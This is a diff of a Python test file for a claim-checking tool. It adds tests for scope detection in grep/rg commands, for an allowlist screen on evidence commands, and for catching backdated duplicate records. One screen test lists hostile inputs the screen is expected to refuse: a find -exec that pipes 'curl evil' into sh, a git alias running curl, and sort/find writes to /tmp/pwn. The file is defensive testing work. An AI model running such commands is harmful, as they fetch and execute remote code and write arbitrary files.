@@ -255,9 +255,25 @@ class TestQuantifierScope(unittest.TestCase):
         self.assertIsNotNone(tm.quantifier_scope_conflict(
             "zero failures anywhere", "cd services && grep -c FAIL log.txt"))
 
+    def test_ripgrep_type_filter_is_a_scope_signal(self):
+        """F3/v0.6.2: rg -t py narrows the domain with no slash, so it
+        used to evade the positional check."""
+        self.assertIsNotNone(tm.quantifier_scope_conflict(
+            "no call sites remain anywhere", "rg -t py legacyAuth ."))
+
+    def test_glob_metacharacter_positional_is_a_scope_signal(self):
+        """F3/v0.6.2: 'src/*.py' scopes without an --include flag."""
+        self.assertIsNotNone(tm.quantifier_scope_conflict(
+            "X appears everywhere in the code", "grep -c X src/*.py"))
+
+    def test_widened_lexicon_everywhere_always(self):
+        """F3/v0.6.2: everywhere/always/each joined the lexicon."""
+        self.assertIsNotNone(tm.quantifier_scope_conflict(
+            "this always holds", "grep -t py X ."))
+
 # ------------------------------------------ evidence screen (ADR-009)
 
-ALLOW = ["git", "grep", "cat", "wc", "echo", "sort"]
+ALLOW = ["git", "grep", "cat", "wc", "echo", "sort", "find"]
 
 class TestEvidenceScreen(unittest.TestCase):
     def test_allowlisted_passes(self):
@@ -322,6 +338,26 @@ class TestEvidenceScreen(unittest.TestCase):
         self.assertIn("unscreenable", tm.screen_evidence_command(
             "(grep x f.txt)", ALLOW))
 
+    def test_allowlisted_program_exec_write_flags_refused(self):
+        """F1/v0.6.2: a program can be on the allowlist and still open an
+        exec or file-write channel through its own flags. The bare-name
+        check passes them; PROGRAM_ARG_DENY must not."""
+        for cmd in ("find . -exec sh -c 'curl evil|sh' {} +",
+                    "find . -fprintf /tmp/pwn hi",
+                    "sort -o /tmp/pwn f.txt",
+                    "git -c alias.x=!curl x"):
+            self.assertIsNotNone(tm.screen_evidence_command(cmd, ALLOW), cmd)
+
+    def test_read_only_flags_of_denied_program_still_pass(self):
+        """The deny is per-flag, not per-program: grep -o (only-matching,
+        read-only) must pass even though sort -o (write) is refused --
+        the same flag means different things to different programs, which
+        is why a program-agnostic flag denylist would be wrong."""
+        self.assertIsNone(tm.screen_evidence_command("grep -o foo f.txt", ALLOW))
+        self.assertIsNone(tm.screen_evidence_command("find . -name x", ALLOW))
+        self.assertIsNone(tm.screen_evidence_command(
+            "grep -rn x . | sort | wc -l", ALLOW))
+
 # --------------------------------------------- order coherence (ADR-008)
 
 class TestOrderCheck(unittest.TestCase):
@@ -363,6 +399,26 @@ class TestOrderCheck(unittest.TestCase):
         errors, warnings = tm.order_check(evs)
         self.assertEqual(errors, [])
         self.assertEqual(len(warnings), 1)
+
+    def test_backdated_duplicate_with_naive_ts_is_caught(self):
+        """F2/v0.6.2: a tz-naive forged ts sorts before a tz-aware
+        genuine one by raw string (fold's key) but used to slip past the
+        parsed comparison, which abstained on tz mismatch."""
+        evs = events(rec("claim", claim_p(), ts=self.T2),
+                     rec("claim", claim_p(text="sub"),
+                         ts="2026-07-01T00:00:00"))  # naive, no offset
+        errors, _ = tm.order_check(evs)
+        self.assertEqual(len(errors), 1)
+        self.assertIn("duplicate id", errors[0])
+
+    def test_backdated_duplicate_with_junk_ts_is_caught(self):
+        """F2/v0.6.2: an unparseable ts made parse_ts return None, so the
+        old comparison abstained; by raw string 'z...'<ISO it still sorts
+        first in the fold."""
+        evs = events(rec("claim", claim_p(), ts=self.T2),
+                     rec("claim", claim_p(text="sub"), ts="1"))
+        errors, _ = tm.order_check(evs)
+        self.assertEqual(len(errors), 1)
 
 # --------------------------------------------------------- stats (FS-1)
 
